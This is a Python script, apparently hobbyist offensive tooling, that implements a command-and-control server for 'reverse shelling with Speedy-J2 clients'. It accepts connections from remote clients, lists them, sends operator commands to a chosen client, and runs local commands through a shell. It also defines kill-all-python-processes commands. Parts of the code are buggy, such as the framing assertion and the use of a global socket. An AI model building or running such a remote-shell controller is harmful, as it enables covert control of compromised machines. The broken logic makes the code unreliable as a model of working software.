"""

                               .,,uod8B8bou,,.
                      ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
                 ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
                 !...:!TVBBBRPFT||||||||||!!^^""'   ||||
                 !.......:!?|||||!!^^""'            ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 `.........||||  ,                 ,||||
                  .;.......||||  ;..-         _.-!!|||||
           .,uodWBBBBb.....||||       _.-!!|||||||||!:'
        !YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
        !`lYBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
        !. `lYBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
        ! `. `lYBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
        !`. `. `lYBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
        `. `. `. `lYBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
          `. `. `. `::::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
            `. `. `.:::::::::::::::::;iof688888888888888888888b.     `
              `. `. ::::::::::;iof688888888888888888888888888888b.
                `. `:::::;iof688888888888888888888888888888888899fT!
                  `.:::!8888888888888888888888888888888899fT|!^"'
                       !!988888888888888888888888899fT|!^"'
                        `!!8888888888888888899fT|!^"'
                          `!988888888899fT|!^"'
                            `!9899fT|!^"'
                              `!^"'


Server for reverse shelling with Speedy-J2 clients

Drop into a shell with keyboardInterrupt:
        - Send everything after a SEND
        - No padding, max 1024 bytes, end with b' AYE'
        - Exit session with 'exit()'

When in a session with a client, no new connections are accepted
"""
import subprocess
import selectors
import socket
import types
import time
import sys

HOST = '127.0.0.1'
PORT = int(sys.argv[1])

sel = selectors.DefaultSelector()

# Listening socket, TCP, IPv4
lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.bind((HOST, PORT))
lsock.listen()
print('listening on', (HOST, PORT))

# Set socket in non-blocking mode
lsock.setblocking(False)
# Register the socket to be monitored with sel.select() for read events
sel.register(lsock, selectors.EVENT_READ, data=None)

# Some commands:
parricide = f"kill -9 $(pgrep -f {sys.argv[0]})"
genocide = "for pid in $(pgrep -f python); do kill -9 $pid; done"
# TODO regicide


def subp_run(command):
    return subprocess.run(command, shell=True,
                          stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT,
                          stdin=subprocess.PIPE,
                          timeout=None)


def accept_wrapper(sock):
    conn, addr = sock.accept()  # Ready to read
    print(f'Accepted client {addr}')
    conn.setblocking(False)
    data = types.SimpleNamespace(addr=addr, inb=b'', outb=b'')
    events = selectors.EVENT_READ | selectors.EVENT_WRITE
    sel.register(conn, events, data=data)


def test_connection(key, mask):
    sock = key.fileobj
    data = key.data
    if mask & selectors.EVENT_READ:  # Sock can be read
        recv_data = sock.recv(5)
        if recv_data:
            print(recv_data.decode())
            assert recv_data == b'Marco'
            data.outb += b'Polo'
        else:
            print("Received nothing from", data.addr)
            sel.unregister(sock)
            sock.close()
    if mask & selectors.EVENT_WRITE:
        if data.outb:

            sent = sock.send(data.outb)  # Returns the number of bytes sent
            data.outb = data.outb[sent:]


def session(s: socket):
    """
    :param s: Connected client
    :return:
    """
    sock.send(b'SHELL')  #

    while True:
        data = input(f"{s.getpeername()[0]}: ")
        if data[:5] == 'SEND ':
            print(data[5:])
            s.send(data[5:].encode())
            assert len(data[5:]) <= 1024
            assert data[:-4] == ' AYE'

        elif data == 'exit()':
            break

# The event loop
while True:
    try:
        events = sel.select(timeout=None)  # blocks until there are sockets ready
        # It returns a k, v for each socket, key.fileobj contains the socket
        # If key.data is None we know its from the listening socket
        for key, mask in events:
            if key.data is None:
                accept_wrapper(key.fileobj)
            else:
                test_connection(key, mask)

    except KeyboardInterrupt as control_flow:

        print("\nAvailable clients: ")
        events = sel.select(timeout=-1)  # Not blocking, report all that are ready
        for i in range(len(events)):
            clientk, m = events[i]
            if clientk.data is not None:
                print(f'{i}' + ': ', clientk.data.addr, '\t')

        selected = int(input("Select a client to shell with: "))

        try:
            clientk = events[selected][0]
            print("Welcome to ", clientk.data.addr)
            sock = clientk.fileobj
            session(sock)
        except Exception as err:
            print(err)
            pass

        sp = subp_run(input("Now what"))
        sp.check_returncode()
        print(sp.stdout.decode('utf-8'))

        pass


#lsock.close()
#sys.exit(1)
